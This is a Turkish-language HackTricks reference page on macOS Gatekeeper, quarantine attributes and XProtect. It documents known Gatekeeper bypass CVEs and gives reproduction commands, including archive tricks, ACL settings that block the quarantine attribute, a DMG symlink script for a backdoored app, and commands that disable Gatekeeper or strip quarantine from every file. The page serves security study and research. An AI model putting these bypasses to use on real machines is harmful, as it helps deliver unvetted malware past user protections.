# macOS Gatekeeper / Karantina / XProtect

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz?** **Şirketinizi HackTricks'te reklamını görmek ister misiniz?** ya da **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grubuna**](https://discord.gg/hRep4RUj7f) veya **telegram grubuna** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks deposuna** [**PR göndererek**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud deposuna**](https://github.com/carlospolop/hacktricks-cloud) **katkıda bulunun**

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Gatekeeper

**Gatekeeper**, Mac işletim sistemleri için geliştirilen bir güvenlik özelliğidir ve kullanıcıların sistemlerinde **yalnızca güvenilir yazılımları çalıştırmalarını** sağlamayı amaçlar. Kullanıcının **App Store dışındaki kaynaklardan** (uygulama, eklenti veya yükleyici paketi gibi) indirdiği ve açmaya çalıştığı yazılımı **doğrulayarak** çalışır.

Gatekeeper'ın ana mekanizması, **doğrulama** sürecinde yatar. İndirilen yazılımın **tanınmış bir geliştirici tarafından imzalandığını** kontrol eder, yazılımın otantikliğini sağlar. Ayrıca, yazılımın **Apple tarafından noterlenip noterlenmediğini** de belirler, bu da yazılımın bilinen kötü amaçlı içerikten yoksun olduğunu ve noterlemeden sonra değiştirilmediğini doğrular.

Ek olarak, Gatekeeper, kullanıcı kontrolünü ve güvenliğini **indirilen yazılımın ilk kez açılmasını onaylamak için kullanıcıları uyararak** güçlendirir. Bu koruma, kullanıcıların zararlı olabilecek yürütülebilir kodları yanlışlıkla zararsız veri dosyası olarak yanlış anlamalarını engellemeye yardımcı olur.

### Uygulama İmzaları

Uygulama imzaları, Apple'ın güvenlik altyapısının kritik bir bileşenidir. Bunlar, yazılım yazarının (geliştiricinin) kimliğini **doğrulamak** ve kodun son imzalandığından beri değiştirilmediğinden emin olmak için kullanılır.

İşleyişi şöyle:

1. **Uygulamanın İmzalanması:** Bir geliştirici uygulamasını dağıtmaya hazır olduğunda, uygulamayı **özel bir anahtar kullanarak imzalar**. Bu özel anahtar, geliştiricinin Apple Geliştirici Programı'na kaydolduğunda Apple'ın geliştiriciye verdiği bir **sertifika** ile ilişkilidir. İmzalama işlemi, uygulamanın tüm parçalarının kriptografik bir özetini oluşturmayı ve bu özeti geliştiricinin özel anahtarıyla şifrelemeyi içerir.
2. **Uygulamanın Dağıtılması:** İmzalanan uygulama, kullanıcılara geliştiricinin sertifikasını içeren birlikte dağıtılır, bu sertifika karşılık gelen genel anahtarı içerir.
3. **Uygulamanın Doğrulanması:** Bir kullanıcı uygulamayı indirip çalıştırmaya çalıştığında, Mac işletim sistemi geliştiricinin sertifikasındaki genel anahtarı kullanarak özeti şifreler. Daha sonra uygulamanın mevcut durumuna dayanarak özeti yeniden hesaplar ve bu şifrelenmiş özeti karşılaştırır. Eşleşirse, bu, uygulamanın geliştirici tarafından imzalandığından beri **değiştirilmediği** anlamına gelir ve sistem uygulamanın çalışmasına izin verir.

Uygulama imzaları, Apple'ın Gatekeeper teknolojisinin önemli bir parçasıdır. Bir kullanıcı **internetten indirilen bir uygulamayı açmaya çalıştığında**, Gatekeeper uygulama imzasını doğrular. Eğer Apple tarafından bilinen bir geliştiriciye verilen bir sertifika ile imzalanmışsa ve kod değiştirilmemişse, Gatekeeper uygulamanın çalışmasına izin verir. Aksi takdirde uygulamayı engeller ve kullanıcıyı uyarır.

macOS Catalina'dan itibaren, **Gatekeeper ayrıca uygulamanın Apple tarafından noterlenip noterlenmediğini de kontrol eder**, ek bir güvenlik katmanı ekler. Noterleme süreci, uygulamayı bilinen güvenlik sorunları ve kötü amaçlı kodlar açısından kontrol eder ve bu kontrolleri geçerse, Apple uygulamaya Gatekeeper'ın doğrulayabileceği bir bilet ekler.

#### İmzaları Kontrol Etme

Bazı **kötü amaçlı yazılım örneğini** kontrol ederken her zaman **binary'nin imzasını kontrol etmelisiniz**, çünkü **imzayı atan geliştirici** zaten **kötü amaçlı yazılımla ilişkili** olabilir.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarizasyon

Apple'ın notarizasyon süreci, kullanıcıları potansiyel olarak zararlı yazılımlardan korumak için ek bir güvenlik önlemi olarak hizmet verir. Bu, geliştiricinin uygulamasını Apple'ın Notary Service tarafından incelenmesi için sunmasıyla gerçekleşir, bu da App Review ile karıştırılmamalıdır. Bu hizmet, gönderilen yazılımı kötü amaçlı içerik ve kod imzalama ile ilgili olası sorunlar açısından inceleyen otomatik bir sistemdir.

Yazılım bu incelemeyi herhangi bir endişe uyandırmadan geçerse, Notary Service bir notarizasyon bileti oluşturur. Geliştiricinin daha sonra bu bileti yazılımlarına eklemesi gerekmektedir, bu işlem 'stapling' olarak bilinir. Ayrıca, notarizasyon bileti de çevrimiçi olarak yayınlanır ve Gatekeeper, Apple'ın güvenlik teknolojisi, buna erişebilir.

Kullanıcının yazılımı ilk kez yüklediğinde veya çalıştırdığında, yürütülebilir dosyaya eklenmiş veya çevrimiçi bulunan notarizasyon bileti - Gatekeeper'a yazılımın Apple tarafından notarize edildiğini bildirir. Sonuç olarak, Gatekeeper, kullanıcıya yazılımın Apple tarafından kötü amaçlı içerikler için kontrol edildiğini belirten açıklayıcı bir mesaj gösterir. Bu süreç, kullanıcıların sistemlerine yükledikleri veya çalıştırdıkları yazılımların güvenliği konusundaki güvenini artırır.

### GateKeeper'ın Sıralanması

GateKeeper, güvenilmeyen uygulamaların yürütülmesini engelleyen birkaç güvenlik bileşeninden oluşur ve aynı zamanda bu bileşenlerden biridir.

GateKeeper'ın durumunu görmek mümkündür:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
GateKeeper imza kontrollerinin yalnızca **Karantina özniteliğine sahip dosyalara** uygulandığını unutmayın.
{% endhint %}

GateKeeper, bir ikili dosyanın yürütülebilir olup olmadığını **tercihlere ve imzaya** göre kontrol eder:

<figure><img src="../../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

Bu yapılandırmayı tutan veritabanı **`/var/db/SystemPolicy`** konumundadır. Bu veritabanını kök olarak şu şekilde kontrol edebilirsiniz:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Not: İlk kuralın "**App Store**" ile bittiğine ve ikincisinin "**Developer ID**" ile bittiğine dikkat edin ve önceki görüntüde **App Store ve tanımlanmış geliştiricilerden uygulamaları çalıştırmaya izin verildiği**.\
Eğer o ayarı App Store olarak **değiştirirseniz, "Notarized Developer ID" kuralları kaybolacaktır**.

Ayrıca **binlerce GKE türünde kural** bulunmaktadır:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Bu, **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** ve **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** dosyalarından gelen karma değerlerdir.

Ya da önceki bilgileri şu şekilde listeleyebilirsiniz:
```bash
sudo spctl --list
```
**`spctl`**'ın **`--master-disable`** ve **`--global-disable`** seçenekleri bu imza kontrollerini tamamen **devre dışı bırakacaktır**:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Tamamen etkinleştirildiğinde, yeni bir seçenek görünecektir:

<figure><img src="../../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

GateKeeper tarafından izin verilip verilmeyeceğini kontrol etmek mümkündür:
```bash
spctl --assess -v /Applications/App.app
```
GateKeeper'a belirli uygulamaların yürütülmesine izin vermek için yeni kurallar eklemek mümkündür:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Karantina Dosyaları

Bir uygulama veya dosya indirildiğinde, web tarayıcıları veya e-posta istemcileri gibi belirli macOS uygulamaları indirilen dosyaya genellikle "**karantina bayrağı**" olarak bilinen bir genişletilmiş dosya özniteliği ekler. Bu öznitelik, dosyayı güvenilmeyen bir kaynaktan (internet) geldiği ve potansiyel riskler taşıdığı şeklinde işaretlemek için bir güvenlik önlemi olarak hareket eder. Ancak, tüm uygulamalar bu özniteliği eklemeyebilir, örneğin, yaygın BitTorrent istemci yazılımları genellikle bu süreci atlar.

**Karantina bayrağının varlığı, bir kullanıcının dosyayı çalıştırmaya çalıştığında macOS'in Gatekeeper güvenlik özelliğine sinyal verir**.

**Karantina bayrağının bulunmadığı durumlarda** (bazı BitTorrent istemcileri aracılığıyla indirilen dosyalar gibi), Gatekeeper'ın **kontrolleri gerçekleştirilmeyebilir**. Bu nedenle, kullanıcılar, daha az güvenli veya bilinmeyen kaynaklardan indirilen dosyaları açarken dikkatli olmalıdır.

{% hint style="info" %}
Kod imzalarının **geçerliliğini kontrol etmek**, kodun ve tüm paketlenmiş kaynakların kriptografik **hash'lerini oluşturmayı** içeren **kaynak yoğun** bir süreçtir. Ayrıca, sertifika geçerliliğini kontrol etmek, sertifikanın verildikten sonra iptal edilip edilmediğini görmek için Apple'ın sunucularına **çevrimiçi bir kontrol** yapmayı içerir. Bu nedenlerden dolayı, her bir uygulama başlatıldığında tam bir kod imzası ve noterlik kontrolünün **her seferinde çalıştırılması uygulanabilir değildir**.

Bu nedenle, bu kontroller, **yalnızca karantina bayrağı özniteliğine sahip uygulamalar çalıştırıldığında çalıştırılır**.
{% endhint %}

{% hint style="warning" %}
Bu öznitelik, dosyayı oluşturan/indiren uygulama tarafından **ayarlanmalıdır**.

Ancak, kumlanmış dosyalar, oluşturdukları her dosyaya bu özniteliğin ayarlanmış olacaktır. Ve kumlanmamış uygulamalar kendileri ayarlayabilir veya **Info.plist** içinde [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) anahtarını belirleyebilirler, bu da sistemin oluşturulan dosyalara `com.apple.quarantine` genişletilmiş özniteliğini ayarlamasını sağlar,
{% endhint %}

Durumunu **kontrol etmek ve etkinleştirmek/devre dışı bırakmak** (kök gerekli) mümkündür:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Ayrıca, bir dosyanın karantina genişletilmiş niteliğine sahip olup olmadığını şu şekilde **bulabilirsiniz**:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
**Genişletilmiş** **özniteliklerin** **değerini** kontrol edin ve karantina özniteliğini yazan uygulamayı bulun:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Gerçekte bir işlem "oluşturduğu dosyalara karantina bayrakları ayarlayabilir" (oluşturulan bir dosyaya USER\_APPROVED bayrağını uygulamayı denedim ancak uygulanmadı):

<details>

<summary>Kaynak Kodu karantina bayraklarını uygula</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</detaylar>

Ve **kaldır** o özelliği şununla:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Ve karantinaya alınmış tüm dosyaları bulun:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Karantina bilgileri ayrıca **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** dizinindeki LaunchServices tarafından yönetilen merkezi bir veritabanında saklanır.

#### **Quarantine.kext**

Çekirdek uzantısı yalnızca sistemdeki **çekirdek önbelleği** aracılığıyla erişilebilir; ancak, **https://developer.apple.com/** adresinden **Kernel Debug Kit** indirebilirsiniz, bu da uzantının sembolleştirilmiş bir sürümünü içerecektir.

### XProtect

XProtect, macOS'ta bulunan yerleşik bir **anti-malware** özelliğidir. XProtect, herhangi bir uygulama ilk kez başlatıldığında veya değiştirildiğinde, bilinen kötü amaçlı yazılımlar ve güvensiz dosya türleri veritabanına karşı kontrol eder. Belirli uygulamalar aracılığıyla dosya indirdiğinizde, örneğin Safari, Posta veya Mesajlar, XProtect dosyayı otomatik olarak tarar. Veritabanındaki herhangi bir bilinen kötü amaçlı yazılımla eşleşirse, XProtect dosyanın çalışmasını **engeller** ve tehdidi size bildirir.

XProtect veritabanı, Apple tarafından düzenli olarak yeni kötü amaçlı yazılım tanımlarıyla güncellenir ve bu güncellemeler otomatik olarak Mac'inize indirilir ve yüklenir. Bu, XProtect'in her zaman en son bilinen tehditlerle güncel olduğunu sağlar.

Ancak, **XProtect'in tam özellikli bir antivirüs çözümü olmadığını** belirtmek gerekir. Yalnızca belirli bilinen tehditleri kontrol eder ve çoğu antivirüs yazılımı gibi erişim üzerinden tarama yapmaz.

En son XProtect güncellemesi hakkında bilgi alabilirsiniz çalıştırarak:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect, **/Library/Apple/System/Library/CoreServices/XProtect.bundle** konumunda bulunur ve içinde XProtect'un kullandığı bilgilere ulaşabilirsiniz:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Bu cdhash'lere sahip kodların eski ayrıcalıkları kullanmasına izin verir.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleID ve TeamID aracılığıyla yüklenmesine izin verilmeyen eklentilerin ve eklentilerin listesi veya bir minimum sürümü belirtir.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Zararlı yazılımları tespit etmek için Yara kuralları.
- **`XProtect.bundle/Contents/Resources/gk.db`**: Engellenmiş uygulamaların ve TeamID'lerin karmaşalarının bulunduğu SQLite3 veritabanı.

XProtect ile ilgili **`/Library/Apple/System/Library/CoreServices/XProtect.app`** konumunda başka bir Uygulama olduğunu unutmayın ve bu Uygulama Gatekeeper işlemiyle ilgili değildir.

### Gatekeeper Değil

{% hint style="danger" %}
Gatekeeper'ın **her uygulamayı çalıştırdığını** unutmayın, sadece _**AppleMobileFileIntegrity**_ (AMFI) yalnızca Gatekeeper tarafından zaten çalıştırılmış ve doğrulanmış bir uygulamayı çalıştırdığınızda **yürütülebilir kod imzalarını doğrular**.
{% endhint %}

Bu nedenle, önceden bir uygulamayı Gatekeeper ile önbelleğe almak için uygulamayı çalıştırmak mümkündü, ardından (Electron asar veya NIB dosyaları gibi) uygulamanın **yürütülebilir olmayan dosyalarını değiştirmek** ve başka korumalar olmadığında, uygulama **zararlı eklemelerle** **çalıştırılıyordu**.

Ancak şimdi macOS, uygulama paketlerinin içindeki dosyaları **değiştirmeyi engeller**. Bu nedenle, [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) saldırısını denerseniz, artık bunu kötüye kullanmanın mümkün olmadığını göreceksiniz çünkü Gatekeeper ile önbelleğe almak için uygulamayı çalıştırdıktan sonra paketi değiştiremeyeceksiniz. Ve örneğin, İçerik dizininin adını NotCon olarak değiştirirseniz (saldırıda belirtildiği gibi) ve ardından uygulamanın ana ikili dosyasını Gatekeeper ile önbelleğe almak için çalıştırırsanız, bir hata alacak ve çalıştırmayacaktır.

## Gatekeeper Atlatmaları

Kullanıcının bir şeyi indirmesini ve Gatekeeper'ın bunu engellemesi gereken bir şeyi çalıştırmasını başarmak her zaman macOS'ta bir güvenlik açığı olarak kabul edilir. Geçmişte Gatekeeper'ı atlamaya izin veren tekniklere atanan bazı CVE'ler şunlardır:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

**Arşiv Yardımcı Programı**'nın kullanılması durumunda, **886 karakteri aşan yollara sahip dosyaların** com.apple.quarantine uzatılmış özniteliğini almadığı gözlemlendi. Bu durum yanlışlıkla bu dosyaların **Gatekeeper'ın** güvenlik kontrollerini **atlamasına** izin verir.

Daha fazla bilgi için [**orijinal rapora**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) bakın.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Bir uygulama **Automator** ile oluşturulduğunda, uygulamanın neyi yürüteceği hakkındaki bilgiler `application.app/Contents/document.wflow` içinde değil yürütülebilir dosyada bulunur. Yürütülebilir dosya yalnızca **Automator Uygulama Taklidi** olarak adlandırılan genel bir Automator ikili dosyasıdır.

Bu nedenle, `application.app/Contents/MacOS/Automator\ Application\ Stub`'ı başka bir sistemdeki Automator Uygulama Taklidi'ne sembolik bir bağlantı yaparak `document.wflow` içinde ne varsa (betiğiniz) **Gatekeeper'ı tetiklemeden** çalıştırabilirsiniz çünkü gerçek yürütülebilir dosyada karantina xattr yoktur.

Beklenen konum örneği: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Daha fazla bilgi için [**orijinal rapora**](https://ronmasas.com/posts/bypass-macos-gatekeeper) bakın.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Bu atlatmada, bir zip dosyası `application.app` yerine `application.app/Contents`'den sıkıştırmaya başlayan bir uygulama oluşturuldu. Bu nedenle, **karantina özniteliği** tüm **dosyalara `application.app/Contents`** uygulandı ancak **`application.app`'ye** uygulanmadı, ki bu Gatekeeper'ın kontrol ettiği şeydi, bu nedenle Gatekeeper, `application.app` tetiklendiğinde **karantina özniteliğine sahip olmadığı için atlatıldı.**
```bash
zip -r test.app/Contents test.zip
```
Daha fazla bilgi için [**orijinal rapora**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) bakın.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Bileşenler farklı olsa da, bu zafiyetin sömürülmesi öncekine çok benzer. Bu durumda **`uygulama.app/İçerikler`** dizininden bir Apple Arşivi oluşturacağız, böylece **`uygulama.app`** **Arşiv Yardımcı Programı** tarafından açıldığında karantina özelliğini almayacak.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Daha fazla bilgi için [**orijinal raporu**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) kontrol edin.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** dosyada bir özniteliği yazmasını engellemek için kullanılabilir:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Ayrıca, **AppleDouble** dosya biçimi, ACE'lerini içeren bir dosyanın kopyasını oluşturur.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebileceği gibi, **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin temsili, dekompresyon yapılmış dosyada ACL olarak ayarlanacaktır. Dolayısıyla, bir uygulamayı diğer xattr'lerin yazılmasını engelleyen bir ACL ile birlikte **AppleDouble** dosya biçimine sahip bir zip dosyasına sıkıştırdıysanız... karantina xattr'si uygulamaya ayarlanmamış olacaktır:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Daha fazla bilgi için [**orijinal raporu**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kontrol edin.

Bu aynı zamanda AppleArchives ile de sömürülebilir:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

**Google Chrome'un indirilen dosyalara karantina özniteliği ayarlamadığı keşfedildi** çünkü bazı macOS iç sorunlarından dolayı.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble dosya biçimleri, bir dosyanın özniteliklerini `._` ile başlayan ayrı bir dosyada saklar, bu **macOS makineleri arasında dosya özniteliklerini kopyalamaya yardımcı olur**. Ancak, bir AppleDouble dosyası sıkıştırıldıktan sonra, `._` ile başlayan dosyaya **karantina özniteliği verilmediği fark edildi**.
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Karantina özniteliğine sahip olmayan bir dosya oluşturabilme yeteneği sayesinde **Gatekeeper'ı atlayabilirsiniz.** Hile, AppleDouble adı konvansiyonunu kullanarak (`._` ile başlatarak) bir DMG dosyası uygulaması oluşturmak ve karantina özniteliğine sahip olmayan bu gizli dosyaya bir sembolik bağ oluşturmaktı.\
**Dmg dosyası çalıştırıldığında**, karantina özniteliğine sahip olmadığı için **Gatekeeper'ı atlayacaktır.**
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Karantina xattr'yi Önle

Bir ".app" paketinde karantina xattr eklenmediğinde, **uygulama çalıştırıldığında Gatekeeper tetiklenmeyecek**.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}
